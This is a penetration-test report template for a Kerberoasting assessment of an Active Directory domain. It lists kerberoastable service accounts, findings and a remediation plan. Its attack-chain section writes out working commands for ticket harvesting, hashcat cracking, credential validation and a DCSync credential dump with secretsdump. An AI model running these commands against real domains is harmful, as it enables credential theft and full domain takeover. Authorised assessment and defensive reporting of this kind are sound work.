# Kerberoasting Assessment Report Template

## Assessment Details

| Field | Value |
|---|---|
| Engagement ID | [ID] |
| Domain | [domain.local] |
| Assessment Date | YYYY-MM-DD |
| Assessor | [Name] |
| Tool | Impacket GetUserSPNs v0.11.0 |

## Summary

| Metric | Value |
|---|---|
| Total Kerberoastable Accounts | XX |
| Cracked Passwords | XX |
| Privileged Accounts Cracked | XX |
| Domain Admin Compromise | Yes/No |

## Kerberoastable Accounts Inventory

| Account | SPN | Privileged | Password Age | Cracked | Risk |
|---|---|---|---|---|---|
| svc_sql | MSSQLSvc/SQL01:1433 | DA Member | 365 days | Yes | Critical |
| svc_web | HTTP/WEB01 | No | 180 days | Yes | High |
| svc_backup | HOST/BACKUP01 | Backup Ops | 730 days | No | High |
| svc_exchange | exchangeMDB/EX01 | No | 90 days | No | Medium |

## Attack Chain

```
1. Obtained domain credentials: jsmith (compromised via phishing)
2. Enumerated SPNs: GetUserSPNs.py corp.local/jsmith:xxx -dc-ip 10.10.10.1
3. Requested TGS tickets: GetUserSPNs.py ... -request -outputfile hashes.txt
4. Cracked offline: hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule
5. Validated credentials: crackmapexec smb DC01 -u svc_sql -p 'cracked_pass'
6. Escalated to DA: svc_sql is member of Domain Admins
7. DCSync: secretsdump.py corp.local/svc_sql:xxx@DC01
```

## Findings

### Finding 1: Kerberoastable Domain Admin Service Account

| Field | Value |
|---|---|
| Severity | Critical (CVSS 9.8) |
| Account | svc_sql@corp.local |
| SPN | MSSQLSvc/SQL01.corp.local:1433 |
| Password Cracked | Yes (weak password) |
| Impact | Full domain compromise via DCSync |
| MITRE ATT&CK | T1558.003 -> T1003.006 |

**Remediation:**
1. Immediately reset svc_sql password to 25+ random characters
2. Remove svc_sql from Domain Admins group
3. Convert to gMSA: `New-ADServiceAccount -Name svc_sql -DNSHostName sql01.corp.local`
4. Disable RC4 encryption for this account

### Finding 2: Multiple Service Accounts with Weak Passwords

| Field | Value |
|---|---|
| Severity | High |
| Accounts | svc_web, svc_iis |
| Time to Crack | < 2 hours |
| Impact | Lateral movement to web servers |
| MITRE ATT&CK | T1558.003 |

## Remediation Plan

### Immediate (0-48 hours)
- [ ] Reset all cracked service account passwords
- [ ] Remove unnecessary Domain Admin memberships
- [ ] Disable RC4 encryption via GPO

### Short-Term (1-2 weeks)
- [ ] Convert service accounts to gMSA where possible
- [ ] Set 25+ character passwords on remaining service accounts
- [ ] Add sensitive accounts to Protected Users group
- [ ] Deploy Event ID 4769 detection rule in SIEM

### Long-Term (1-3 months)
- [ ] Implement quarterly service account password rotation
- [ ] Deploy honeypot SPN accounts
- [ ] Conduct regular BloodHound assessments
- [ ] Implement tiered Active Directory administration model
